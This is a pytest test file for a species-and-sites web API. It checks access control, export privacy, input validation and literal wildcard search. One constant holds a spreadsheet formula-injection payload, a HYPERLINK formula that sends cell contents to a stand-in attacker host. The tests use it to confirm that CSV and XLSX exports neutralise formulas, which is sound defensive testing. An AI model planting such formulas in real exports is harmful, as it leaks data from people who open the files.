import csv
import io
from datetime import datetime, timezone

import openpyxl
import pytest

from app.services import export_service


@pytest.fixture(autouse=True)
def _exports_tmp_dir(tmp_path, monkeypatch):
    monkeypatch.setattr(export_service, "EXPORTS_DIR", str(tmp_path))


def _site(client, headers, name="AC Site", code="AC"):
    r = client.post("/api/v1/sites", json={"name": name, "code": code}, headers=headers)
    assert r.status_code == 201, r.text
    return r.json()


def test_species_check_and_lookup_require_sign_in(client):
    assert client.get("/api/v1/species/check?scientific_name=Felis catus").status_code in (401, 403)
    r = client.post("/api/v1/species/lookup", json={"scientific_name": "Felis catus"})
    assert r.status_code in (401, 403)


def test_exports_are_private_to_their_requester(client, admin_headers, researcher_headers):
    _site(client, admin_headers)
    mine = client.post("/api/v1/exports", json={"format": "csv"}, headers=admin_headers).json()
    assert "file_path" not in mine

    assert client.get(f"/api/v1/exports/{mine['id']}", headers=researcher_headers).status_code == 404
    dl = client.get(f"/api/v1/exports/{mine['id']}/download", headers=researcher_headers)
    assert dl.status_code == 404

    theirs = client.post(
        "/api/v1/exports", json={"format": "csv"}, headers=researcher_headers
    ).json()
    # Admins can see everyone's exports; the list shows only your own.
    assert client.get(f"/api/v1/exports/{theirs['id']}", headers=admin_headers).status_code == 200
    listed = client.get("/api/v1/exports", headers=researcher_headers).json()
    assert [e["id"] for e in listed] == [theirs["id"]]


PAYLOAD = '=HYPERLINK("https://evil.example/?d="&A2,"Click")'


def _species_with_formula(client, headers):
    site = _site(client, headers, "Formula", "FX")
    r = client.post(
        "/api/v1/species",
        json={"scientific_name": "Genus injectus", "common_name": PAYLOAD, "site_id": site["id"]},
        headers=headers,
    )
    assert r.status_code == 201, r.text


def test_csv_export_neutralises_formulas(client, admin_headers):
    _species_with_formula(client, admin_headers)
    export = client.post("/api/v1/exports", json={"format": "csv"}, headers=admin_headers).json()
    body = client.get(f"/api/v1/exports/{export['id']}/download", headers=admin_headers).content
    rows = list(csv.reader(io.StringIO(body.decode("utf-8-sig"))))
    common = rows[1][rows[0].index("common_name")]
    assert common == "'" + PAYLOAD


def test_xlsx_export_stores_formulas_as_text(client, admin_headers):
    _species_with_formula(client, admin_headers)
    export = client.post("/api/v1/exports", json={"format": "xlsx"}, headers=admin_headers).json()
    body = client.get(f"/api/v1/exports/{export['id']}/download", headers=admin_headers).content
    sheet = openpyxl.load_workbook(io.BytesIO(body)).active
    header = [c.value for c in sheet[1]]
    cell = sheet.cell(row=2, column=header.index("common_name") + 1)
    assert cell.value == PAYLOAD
    assert cell.data_type == "s"  # text, not formula


def test_date_only_date_to_includes_that_day(client, admin_headers):
    site = _site(client, admin_headers, "Dates", "DT")
    client.post(
        "/api/v1/species",
        json={"scientific_name": "Genus hodiernus", "site_id": site["id"]},
        headers=admin_headers,
    )
    today = datetime.now(timezone.utc).date().isoformat()
    export = client.post(
        "/api/v1/exports",
        json={"format": "csv", "filters": {"date_from": today, "date_to": today}},
        headers=admin_headers,
    ).json()
    body = client.get(f"/api/v1/exports/{export['id']}/download", headers=admin_headers).content
    assert "Genus hodiernus" in body.decode("utf-8-sig")


def test_last_admin_cannot_be_removed(client, admin_user, admin_headers, researcher_role):
    r = client.patch(
        f"/api/v1/users/{admin_user.id}",
        json={"role_id": researcher_role.id},
        headers=admin_headers,
    )
    assert r.status_code == 400


def test_unknown_role_is_a_400(client, admin_user, admin_headers, researcher_user):
    r = client.patch(
        f"/api/v1/users/{researcher_user.id}", json={"role_id": 999}, headers=admin_headers
    )
    assert r.status_code == 400


def test_only_recorder_or_admin_unlinks_species(
    client, admin_headers, researcher_headers, researcher_user
):
    site = _site(client, admin_headers, "Unlink", "UL")
    species = client.post(
        "/api/v1/species",
        json={"scientific_name": "Genus adminus", "site_id": site["id"]},
        headers=admin_headers,
    ).json()
    url = f"/api/v1/sites/{site['id']}/species/{species['id']}"
    assert client.delete(url, headers=researcher_headers).status_code == 403
    assert client.delete(url, headers=admin_headers).status_code == 200

    mine = client.post(
        "/api/v1/species",
        json={"scientific_name": "Genus researcherus", "site_id": site["id"]},
        headers=researcher_headers,
    ).json()
    url = f"/api/v1/sites/{site['id']}/species/{mine['id']}"
    assert client.delete(url, headers=researcher_headers).status_code == 200


def test_overlong_values_are_rejected_cleanly(client, admin_headers):
    r = client.post("/api/v1/sites", json={"name": "x" * 300}, headers=admin_headers)
    assert r.status_code == 422
    r = client.post("/api/v1/sites", json={"name": "   "}, headers=admin_headers)
    assert r.status_code == 422


def test_blank_site_codes_do_not_collide(client, admin_headers):
    for name in ("No code 1", "No code 2"):
        r = client.post("/api/v1/sites", json={"name": name, "code": ""}, headers=admin_headers)
        assert r.status_code == 201, r.text
        assert r.json()["code"] is None


def test_search_wildcards_match_literally(client, admin_headers):
    site = _site(client, admin_headers, "Like", "LK")
    client.post(
        "/api/v1/species",
        json={"scientific_name": "Genus plainus", "site_id": site["id"]},
        headers=admin_headers,
    )
    r = client.get("/api/v1/species?search=%25", headers=admin_headers)  # "%"
    assert r.status_code == 200
    assert r.json()["total"] == 0


def test_graphics_job_requires_existing_site(client, admin_headers):
    r = client.post(
        "/api/v1/graphics/jobs", json={"site_id": 999999, "graphic_type": "iucn"},
        headers=admin_headers,
    )
    assert r.status_code == 404


def test_associating_to_missing_site_is_404(client, admin_headers):
    site = _site(client, admin_headers, "Assoc", "AS")
    species = client.post(
        "/api/v1/species",
        json={"scientific_name": "Genus associatus", "site_id": site["id"]},
        headers=admin_headers,
    ).json()
    r = client.post(
        "/api/v1/sites/999999/species", json={"species_id": species["id"]}, headers=admin_headers
    )
    assert r.status_code == 404
